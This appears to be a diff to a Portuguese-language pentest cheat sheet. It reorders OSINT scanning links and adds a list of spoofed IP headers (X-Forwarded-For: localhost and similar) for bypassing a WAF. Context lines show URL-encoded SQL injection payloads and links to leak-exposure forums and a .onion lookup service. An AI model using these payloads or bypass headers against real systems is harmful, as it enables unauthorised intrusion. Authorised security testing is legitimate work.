@@ -46,8 +46,9 @@ http://xjypo5vzgmo7jca6b322dnqbsdnp3amd24ybx26x5nxbusccjkm4pwid.onion (Consulta 
 https://raidforums.com (Forum com exposição de vazamentos)
 
 **OSINT**
-https://wigle.net/ (Mapeamento mundial de redes wifi)
+https://search.censys.io/ (Scan de IPs e portas)
 https://www.shodan.io/ (Scan de IPs e portas)
+https://wigle.net/ (Mapeamento mundial de redes wifi)
 https://www.exploit-db.com/google-hacking-database/ (Google dorking)
 https://www.shhgit.com/ (Monitoramento em tempo real de possíveis informações sensíveis sendo commitadas no GitHub, GitLab e BitBucket)
 https://osintframework.com/ (Grande indexador de ferramentas e OSINT's para reconhecimento e pentest)
@@ -321,4 +322,18 @@ SQL Injection exemplos:
 
 /?id=1%27%20AND%20%271%27=(sELecT%20@LOL:=1)%20--+
 /?id=1%27%20AND%20%271%27=(sELecT%20@LOL:=12)%20--+
+```
+
+WAF - ByPass Controle por IP
+```
+X-Originating-IP:localhost
+X-Forwarded-For:localhost
+X-Remote-IP:localhost
+X-Remote-Addr:localhost
+X-Forwarded-Host:localhost
+X-Client-IP:localhost
+X-Remote-IP:localhost
+X-Remote-Addr:localhost
+X-Host:localhost
+True-Client-Ip:localhost
 ```
